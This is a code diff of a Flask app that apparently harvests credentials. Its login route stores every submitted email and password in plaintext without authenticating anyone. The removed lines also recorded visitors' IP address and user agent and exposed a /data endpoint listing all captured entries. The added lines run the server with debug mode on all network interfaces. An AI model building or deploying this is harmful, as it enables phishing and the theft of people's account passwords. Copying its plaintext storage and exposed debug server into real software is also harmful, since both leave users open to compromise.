@@ -4,38 +4,31 @@ import os
 
 app = Flask(__name__)
 
-# Initialize DB
+# Create the database and users table if it doesn't exist
 def init_db():
-    conn = sqlite3.connect('credentials.db')
+    conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS credentials (
+    c.execute('''CREATE TABLE IF NOT EXISTS users (
                     id INTEGER PRIMARY KEY AUTOINCREMENT,
                     email TEXT NOT NULL,
-                    password TEXT NOT NULL,
-                    ip_address TEXT,
-                    user_agent TEXT,
-                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                    password TEXT NOT NULL
                 )''')
     conn.commit()
     conn.close()
 
-init_db()
-
 @app.route('/')
-def login_page():
+def index():
     return render_template('login.html')
 
 @app.route('/login', methods=['POST'])
 def login():
-    email = request.form.get('email')
-    password = request.form.get('password')
-    ip_address = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
+    email = request.form['email']
+    password = request.form['password']
 
-    conn = sqlite3.connect('credentials.db')
+    # Save credentials to SQLite
+    conn = sqlite3.connect('database.db')
     c = conn.cursor()
-    c.execute("INSERT INTO credentials (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
-              (email, password, ip_address, user_agent))
+    c.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, password))
     conn.commit()
     conn.close()
 
@@ -45,14 +38,7 @@ def login():
 def dashboard():
     return render_template('dashboard.html')
 
-@app.route('/data')
-def show_data():
-    conn = sqlite3.connect('credentials.db')
-    c = conn.cursor()
-    c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
-    data = c.fetchall()
-    conn.close()
-    return {'credentials': data}
-
 if __name__ == '__main__':
-    app.run(debug=True)
+    init_db()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port, debug=True)
